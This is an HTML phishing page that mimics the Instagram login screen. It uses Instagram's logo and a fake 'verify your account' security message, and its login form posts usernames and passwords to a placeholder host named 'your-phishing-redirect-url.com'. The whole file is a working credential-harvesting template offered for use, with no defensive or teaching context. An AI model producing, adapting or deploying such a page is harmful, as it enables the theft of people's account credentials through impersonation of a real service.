<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram Login</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #f0f2f5, #e3e6eb);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
 
    .login-container {
      background-color: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }
 
    .login-container h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #000;
    }
 
    .login-container .form-group {
      margin-bottom: 20px;
    }
 
    .login-container .form-group label {
      display: block;
      margin-bottom: 8px;
      color: #333;
    }
 
    .login-container .form-group input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }
 
    .login-container .form-group input:focus {
      border-color: #0095f6;
      outline: none;
    }
 
    .login-container .remember-me {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }
 
    .login-container .remember-me label {
      font-size: 14px;
      color: #333;
    }
 
    .login-container .remember-me input {
      margin-right: 10px;
    }
 
    .login-container .btn {
      width: 100%;
      padding: 12px;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
 
    .login-container .btn:hover {
      background-color: #0077cc;
    }
 
    .login-container .facebook-btn {
      width: 100%;
      padding: 12px;
      background-color: #4267B2;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      margin-bottom: 15px;
    }
 
    .login-container .facebook-btn:hover {
      background-color: #365899;
    }
 
    .login-container .footer {
      text-align: center;
      font-size: 14px;
      color: #666;
      margin-top: 20px;
    }
 
    .login-container .footer a {
      color: #0095f6;
      text-decoration: none;
    }
 
    .login-container .footer a:hover {
      text-decoration: underline;
    }
 
    .instagram-logo {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
 
    .instagram-logo img {
      width: 120px;
    }
 
    .verify-message {
      text-align: center;
      font-size: 14px;
      color: #333;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="instagram-logo">
      <img src="https://www.instagram.com/static/images/ico/favicon-180.png" alt="Instagram Logo" />
    </div>
    <h2>Log in to Instagram</h2>
    <div class="verify-message">
      To ensure security, please verify your account with the following code:
    </div>
    <form action="https://your-phishing-redirect-url.com" method="POST">
      <div class="form-group">
        <label for="username">Phone number, username, or email</label>
        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required />
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Password" required />
      </div>
      <div class="remember-me">
        <label>
          <input type="checkbox" name="remember" id="remember" /> Remember me
        </label>
        <a href="#">Forgot password?</a>
      </div>
      <button type="submit" class="btn">Log in</button>
      <button type="button" class="facebook-btn">Log in with Facebook</button>
    </form>
    <div class="footer">
      <p>
        Don't have an account? <a href="#">Sign up</a>
      </p>
    </div>
  </div>
</body>
</html>
